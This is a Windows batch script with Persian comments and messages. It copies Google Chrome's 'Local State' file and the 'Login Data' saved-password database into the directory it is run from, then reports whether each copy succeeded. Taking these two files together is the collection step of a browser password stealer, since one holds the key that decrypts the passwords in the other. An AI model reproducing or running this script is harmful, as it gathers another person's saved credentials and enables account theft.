@echo off
setlocal

:: تنظیم مسیرهای کروم
set "LOCAL_STATE=%LOCALAPPDATA%\Google\Chrome\User Data\Local State"
set "LOGIN_DATA=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"

:: تنظیم مسیر مقصد (مسیر فعلی که فایل bat اجرا شده است)
set "DEST=%CD%"

:: کپی فایل‌ها
copy "%LOCAL_STATE%" "%DEST%\Local State" >nul 2>&1
if %errorlevel%==0 (
    echo ✅ فایل "Local State" با موفقیت کپی شد.
) else (
    echo ❌ خطا در کپی کردن "Local State".
)

copy "%LOGIN_DATA%" "%DEST%\Login Data" >nul 2>&1
if %errorlevel%==0 (
    echo ✅ فایل "Login Data" با موفقیت کپی شد.
) else (
    echo ❌ خطا در کپی کردن "Login Data".
)

pause
